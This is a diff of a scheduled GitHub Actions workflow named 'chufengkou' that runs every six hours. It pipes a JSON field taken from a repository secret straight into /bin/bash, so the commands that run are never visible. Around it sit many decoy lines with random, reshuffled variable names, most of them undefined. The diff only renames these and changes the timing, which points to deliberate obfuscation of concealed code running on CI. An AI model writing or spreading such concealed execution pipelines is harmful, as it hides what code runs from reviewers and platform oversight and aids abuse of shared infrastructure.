@@ -3,9 +3,8 @@ name: chufengkou
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 0/6 * * *'
-
-jobs:  # 30979
+    - cron: '43 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,22 +12,25 @@ jobs:  # 30979
       - uses: actions/checkout@v4
       - name: chufengkou
         env:
-          ovvb3: ${{ secrets.ovvb3 }}
+          wssi0: ${{ secrets.wssi0 }}
         run: |
-          echo $ovvb3 | jq -r .ll3059 | /bin/bash
-          echo $rpel76575 | jq -r .qge131 | /bin/bash
-          echo $nyz09152 | jq -r .q96087 | /bin/bash
-          echo $hdtxi965 | jq -r .vgeb42199 | /bin/bash
-          echo $cayh431 | jq -r .zqe9 | /bin/bash
-          echo $fp20437 | jq -r .ck580 | /bin/bash
-          echo $er3 | jq -r .dffmo4465 | /bin/bash
-          echo $xeu04 | jq -r .lwj9 | /bin/bash
-          echo $dld69582 | jq -r .ctt043 | /bin/bash
-          echo $c9 | jq -r .ciu21 | /bin/bash
-          echo $rwuu37 | jq -r .d7 | /bin/bash
-          echo $gbij78891 | jq -r .ee14 | /bin/bash
-          echo $lbyyu57 | jq -r .nhoj12 | /bin/bash
-          echo $uwnmr596 | jq -r .jyuo85586 | /bin/bash
-          echo $ecff873 | jq -r .xvpk5932 | /bin/bash
-          echo $ureu7816 | jq -r .xia4727 | /bin/bash
+          echo $wssi0 | jq -r .hwto5 | /bin/bash
+          echo $tgg7893 | jq -r .y31938 | /bin/bash
+          echo $y701 | jq -r .ekj74602 | /bin/bash
+          echo $ldvfo05480 | jq -r .tva40990 | /bin/bash
+          echo $cyk16868 | jq -r .vdw91 | /bin/bash
+          echo $g55182 | jq -r .dp21 | /bin/bash
+          echo $os3683 | jq -r .zst760 | /bin/bash
+          echo $sbf489 | jq -r .u46613 | /bin/bash
+          echo $koytd6682 | jq -r .n5 | /bin/bash
+          echo $f2500 | jq -r .ii66 | /bin/bash
+          echo $vzayx5633 | jq -r .c3704 | /bin/bash
+          echo $ie17008 | jq -r .w113 | /bin/bash
+          echo $kijcj4 | jq -r .qv3297 | /bin/bash
+          echo $hbey309 | jq -r .zgl780 | /bin/bash
+          echo $rsuua76978 | jq -r .od2 | /bin/bash
+          echo $nqve0 | jq -r .r6 | /bin/bash
+          echo $vjfa3004 | jq -r .ra4 | /bin/bash
+          echo $mejn31 | jq -r .cjtfm50712 | /bin/bash
+          echo $s748 | jq -r .vpubm922 | /bin/bash
 
